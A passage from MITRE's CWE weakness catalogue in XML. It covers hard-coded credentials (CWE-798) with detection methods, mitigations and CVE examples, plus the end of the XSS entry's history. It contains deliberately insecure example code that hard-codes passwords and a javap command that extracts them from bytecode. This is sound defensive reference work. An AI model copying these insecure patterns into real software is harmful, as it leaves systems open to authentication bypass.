            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Causal_Nature, Demonstrative_Examples, Enabling_Factors_for_Exploitation, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Demonstrative_Examples, Description, Observed_Examples, References, Relationship_Notes, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated References, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Background_Details, Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Demonstrative_Examples, Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Cross-site Scripting (XSS)</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-01-12">Failure to Sanitize Directives in a Web Page (aka 'Cross-site scripting' (XSS))</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Failure to Preserve Web Page Structure (aka 'Cross-site Scripting')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-06-21">Failure to Preserve Web Page Structure ('Cross-site Scripting')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="798" Name="Use of Hard-coded Credentials" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product contains hard-coded credentials, such as a password or cryptographic key, which it uses for its own inbound authentication, outbound communication to external components, or encryption of internal data.</Description>
         <Extended_Description>
            <xhtml:p>Hard-coded credentials typically create a significant hole that allows an attacker to bypass the authentication that has been configured by the product administrator. This hole might be difficult for the system administrator to detect. Even if detected, it can be difficult to fix, so the administrator may be forced into disabling the product entirely. There are two main variations:</xhtml:p>
            <xhtml:div style="margin-left:1em;">
               <xhtml:div>Inbound: the product contains an authentication mechanism that checks the input credentials against a hard-coded set of credentials.</xhtml:div>
               <xhtml:div>Outbound: the product connects to another system or component, and it contains hard-coded credentials for connecting to that component.</xhtml:div>
            </xhtml:div>
            <xhtml:p>In the Inbound variant, a default administration account is created, and a simple password is hard-coded into the product and associated with that account. This hard-coded password is the same for each installation of the product, and it usually cannot be changed or disabled by system administrators without manually modifying the program, or otherwise patching the product. If the password is ever discovered or published (a common occurrence on the Internet), then anybody with knowledge of this password can access the product. Finally, since all installations of the product will have the same password, even across different organizations, this enables massive attacks such as worms to take place.</xhtml:p>
            <xhtml:p>The Outbound variant applies to front-end systems that authenticate with a back-end service. The back-end service may require a fixed password which can be easily discovered. The programmer may simply hard-code those back-end credentials into the front-end product. Any user of that program may be able to extract the password. Client-side systems with hard-coded passwords pose even more of a threat, since the extraction of a password from a binary is usually very simple.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="1391" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="344" View_ID="1000"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="671" View_ID="1000"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="257" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Mobile" Prevalence="Undetermined"/>
            <Technology Class="ICS/OT" Prevalence="Often"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>If hard-coded passwords are used, it is almost certain that malicious users will gain access to the account in question.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Scope>Access Control</Scope>
               <Scope>Other</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>Other</Impact>
               <Note>This weakness can lead to the exposure of resources or functionality to unintended actors, possibly providing attackers with sensitive information or even execute arbitrary code.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Black Box</Method>
               <Description>Credential storage in configuration files is findable using black box methods, but the use of hard-coded credentials for an incoming authentication routine typically involves an account that is not visible outside of the code.</Description>
               <Effectiveness>Moderate</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>Automated white box techniques have been published for detecting hard-coded credentials for incoming authentication, but there is some expert disagreement regarding their effectiveness and applicability to a broad range of methods.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis</Method>
               <Description>This weakness may be detectable using manual code analysis. Unless authentication is decentralized and applied throughout the product, there can be sufficient time for the analyst to find incoming authentication routines and examine the program logic looking for usage of hard-coded credentials. Configuration files could also be analyzed.</Description>
               <Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Dynamic Analysis</Method>
               <Description>
                  <xhtml:p>For hard-coded credentials in incoming authentication: use monitoring tools that examine the product's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the product was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.</xhtml:p>
                  <xhtml:p>Attach the monitor to the process and perform a login. Using call trees or similar artifacts from the output, examine the associated behaviors and see if any of them appear to be comparing the input to a fixed string or value.</xhtml:p>
               </Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Network Sniffer</xhtml:li>
                           <xhtml:li>Forced Path Execution</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Configuration Checker</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>For outbound authentication: store passwords, keys, and other credentials outside of the code in a strongly-protected, encrypted configuration file or database that is protected from access by all outsiders, including other local users on the same system. Properly protect the key (CWE-320). If you cannot use encryption to protect the file, then make sure that the permissions are as restrictive as possible [REF-7].</xhtml:p>
                  <xhtml:p>In Windows environments, the Encrypted File System (EFS) may provide some protection.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>For inbound authentication: Rather than hard-code a default username and password, key, or other authentication credentials for first time logins, utilize a "first login" mode that requires the user to enter a unique strong password or key.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>If the product must contain hard-coded credentials or they cannot be removed, perform access control checks and limit which entities can access the feature that requires the hard-coded credentials. For example, a feature might only be enabled through the system console instead of through a network connection.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>For inbound authentication using passwords: apply strong one-way hashes to passwords and store those hashes in a configuration file or database with appropriate access control. That way, theft of the file/database still requires the attacker to try to crack the password. When handling an incoming password during authentication, take the hash of the password and compare it to the saved hash.</xhtml:p>
                  <xhtml:p>Use randomly assigned salts for each separate hash that is generated. This increases the amount of computation that an attacker needs to conduct a brute-force attack, possibly limiting the effectiveness of the rainbow table method.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>For front-end to back-end connections: Three solutions are possible, although none are complete.</xhtml:p>
                     <xhtml:ul>
                        <xhtml:li>The first suggestion involves the use of generated passwords or keys that are changed automatically and must be entered at given time intervals by a system administrator. These passwords will be held in memory and only be valid for the time intervals.</xhtml:li>
                        <xhtml:li>Next, the passwords or keys should be limited at the back end to only performing actions valid for the front end, as opposed to having full access.</xhtml:li>
                        <xhtml:li>Finally, the messages sent should be tagged and checksummed with time sensitive values so as to prevent replay-style attacks.</xhtml:li>
                     </xhtml:ul>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-13">
               <Intro_Text>The following code uses a hard-coded password to connect to a database:</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>DriverManager.getConnection(url, "scott", "tiger");<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>This is an example of an external hard-coded password on the client-side of a connection. This code will run successfully, but anyone who has access to it will have access to the password. Once the program has shipped, there is no going back from the database user "scott" with a password of "tiger" unless the program is patched. A devious employee with access to this information can use it to break into the system. Even worse, if attackers have access to the bytecode for application, they can use the javap -c command to access the disassembled code, which will contain the values of the passwords used. The result of this operation might look something like the following for the example above:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>javap -c ConnMngr.class<xhtml:div style="margin-left:1em;">22: ldc #36; //String jdbc:mysql://ixne.com/rxsql<xhtml:br/>24: ldc #38; //String scott<xhtml:br/>26: ldc #17; //String tiger</xhtml:div>
                  </xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-14">
               <Intro_Text>The following code is an example of an internal hard-coded password in the back-end:</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>int VerifyAdmin(char *password) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>if (strcmp(password, "Mew!")) {<xhtml:div style="margin-left:1em;">
                              <xhtml:div>
                                 printf("Incorrect Password!\n");<xhtml:br/>return(0)</xhtml:div>
                           </xhtml:div>}<xhtml:br/>printf("Entering Diagnostic Mode...\n");<xhtml:br/>return(1);</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>int VerifyAdmin(String password) {<xhtml:div style="margin-left:1em;">if (!password.equals("Mew!")) {<xhtml:div style="margin-left:1em;">return(0)</xhtml:div>}<xhtml:br/>//Diagnostic Mode<xhtml:br/>return(1);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Every instance of this program can be placed into diagnostic mode with the same password. Even worse is the fact that if this program is distributed as a binary-only distribution, it is very difficult to change that password or disable this "functionality."</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-92">
               <Intro_Text>The following code examples attempt to verify a password using a hard-coded cryptographic key.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>int VerifyAdmin(char *password) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>if (strcmp(password,"68af404b513073584c4b6f22b6c63e6b")) {<xhtml:div style="margin-left:1em;">
                              <xhtml:div>
                                 <xhtml:br/>printf("Incorrect Password!\n");<xhtml:br/>return(0);</xhtml:div>
                           </xhtml:div>}<xhtml:br/>printf("Entering Diagnostic Mode...\n");<xhtml:br/>return(1);</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public boolean VerifyAdmin(String password) {<xhtml:div style="margin-left:1em;">if (password.equals("68af404b513073584c4b6f22b6c63e6b")) {<xhtml:div style="margin-left:1em;">System.out.println("Entering Diagnostic Mode...");<xhtml:br/>return true;</xhtml:div>}<xhtml:br/>System.out.println("Incorrect Password!");<xhtml:br/>return false;</xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="C#">
                  <xhtml:div>int VerifyAdmin(String password) {<xhtml:div style="margin-left:1em;">if (password.Equals("68af404b513073584c4b6f22b6c63e6b")) {<xhtml:div style="margin-left:1em;">Console.WriteLine("Entering Diagnostic Mode...");<xhtml:br/>return(1);</xhtml:div>}<xhtml:br/>Console.WriteLine("Incorrect Password!");<xhtml:br/>return(0);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The cryptographic key is within a hard-coded string value that is compared to the password. It is likely that an attacker will be able to read the key and compromise the system.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-43">
               <Intro_Text>The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in cleartext.</Intro_Text>
               <Body_Text>This Java example shows a properties file with a cleartext username / password pair.</Body_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>
                     <xhtml:br/>
                     <xhtml:i># Java Web App ResourceBundle properties file</xhtml:i>
                     <xhtml:br/>...<xhtml:br/>webapp.ldap.username=secretUsername<xhtml:br/>webapp.ldap.password=secretPassword<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in cleartext.</Body_Text>
               <Example_Code Nature="Bad" Language="ASP.NET">
                  <xhtml:div>...<xhtml:br/>&lt;connectionStrings&gt;<xhtml:div style="margin-left:1em;">&lt;add name="ud_DEV" connectionString="connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;" providerName="System.Data.Odbc" /&gt;</xhtml:div>&lt;/connectionStrings&gt;<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>Username and password information should not be included in a configuration file or a properties file in cleartext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information.</Body_Text>
            </Demonstrative_Example>
	    <Demonstrative_Example Demonstrative_Example_ID="DX-153">
	      <Intro_Text>In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were "insecure by design" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.</Intro_Text>
	      <Body_Text>Multiple vendors used hard-coded credentials in their OT products.</Body_Text>
	    </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-29953</Reference>
               <Description>Condition Monitor firmware has a maintenance interface with hard-coded credentials</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-29953</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-29960</Reference>
               <Description>Engineering Workstation uses hard-coded cryptographic keys that could allow for unathorized filesystem access and privilege escalation</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-29960</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-29964</Reference>
               <Description>Distributed Control System (DCS) has hard-coded passwords for local shell access</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-29964</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30997</Reference>
               <Description>Programmable Logic Controller (PLC) has a maintenance service that uses undocumented, hard-coded credentials</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30997</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30314</Reference>
               <Description>Firmware for a Safety Instrumented System (SIS) has hard-coded credentials for access to boot configuration</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30314</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30271</Reference>
               <Description>Remote Terminal Unit (RTU) uses a hard-coded SSH private key that is likely to be used in typical deployments</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30271</Link>
            </Observed_Example>
	    <Observed_Example>
	      <Reference>CVE-2021-37555</Reference>
	      <Description>Telnet service for IoT feeder for dogs and cats has hard-coded password [REF-1288]</Description>
	      <Link>https://www.cve.org/CVERecord?id=CVE-2021-37555</Link>
	    </Observed_Example>
	    <Observed_Example>
	      <Reference>CVE-2012-3503</Reference>
	      <Description>Installation script has a hard-coded secret token value, allowing attackers to bypass authentication</Description>
	      <Link>https://www.cve.org/CVERecord?id=CVE-2012-3503</Link>
	    </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-2772</Reference>
               <Description>SCADA system uses a hard-coded password to protect back-end database containing authorization information, exploited by Stuxnet worm</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-2772</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-2073</Reference>
               <Description>FTP server library uses hard-coded usernames and passwords for three default accounts</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-2073</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-1573</Reference>
               <Description>Chain: Router firmware uses hard-coded username and password for access to debug functionality, which can be used to execute arbitrary code</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-1573</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2369</Reference>
               <Description>Server uses hard-coded authentication key</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2369</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0961</Reference>
               <Description>Backup product uses hard-coded username and password, allowing attackers to bypass authentication via the RPC interface</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0961</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1160</Reference>
               <Description>Security appliance uses hard-coded password allowing attackers to gain root access</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1160</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-7142</Reference>
               <Description>Drive encryption product stores hard-coded cryptographic keys for encrypted configuration files in executable programs</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-7142</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3716</Reference>
               <Description>VoIP product uses hard-coded public credentials that cannot be changed, which allows attackers to obtain sensitive information</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3716</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3803</Reference>
               <Description>VoIP product uses hard coded public and private SNMP community strings that cannot be changed, which allows remote attackers to obtain sensitive information</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3803</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0496</Reference>
               <Description>Backup product contains hard-coded credentials that effectively serve as a back door, which allows remote attackers to access the file system</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0496</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>MSC03-J</Entry_ID>
               <Entry_Name>Never hard code sensitive information</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OMG ASCSM">
                <Entry_ID>ASCSM-CWE-798</Entry_ID>
            </Taxonomy_Mapping>
           <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			 <Entry_ID>Part 3-3</Entry_ID>
             <Entry_Name>Req SR 1.5</Entry_Name>
           </Taxonomy_Mapping>
           <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			 <Entry_ID>Part 4-2</Entry_ID>
             <Entry_Name>Req CR 1.5</Entry_Name>
           </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="191"/>
            <Related_Attack_Pattern CAPEC_ID="70"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-7" Section="Chapter 8, &#34;Key Management Issues&#34; Page 272"/>
            <Reference External_Reference_ID="REF-729"/>
            <Reference External_Reference_ID="REF-172"/>
            <Reference External_Reference_ID="REF-962" Section="ASCSM-CWE-798"/>
            <Reference External_Reference_ID="REF-1283"/>
            <Reference External_Reference_ID="REF-1288"/>
            <Reference External_Reference_ID="REF-1304"/>
         </References>
         <Notes>
	       <Note Type="Maintenance">The Taxonomy_Mappings to ISA/IEC 62443 were added in CWE 4.10, but they are still under review and might change in future CWE versions. These draft mappings were performed by members of the "Mapping CWE to 62443" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG), and their work is incomplete as of CWE 4.10. The mappings are included to facilitate discussion and review by the broader ICS/OT community, and they are likely to change in future CWE versions.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2010-01-15</Submission_Date>
               <Submission_Comment>More abstract entry for hard-coded password and hard-coded cryptographic key.</Submission_Comment>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
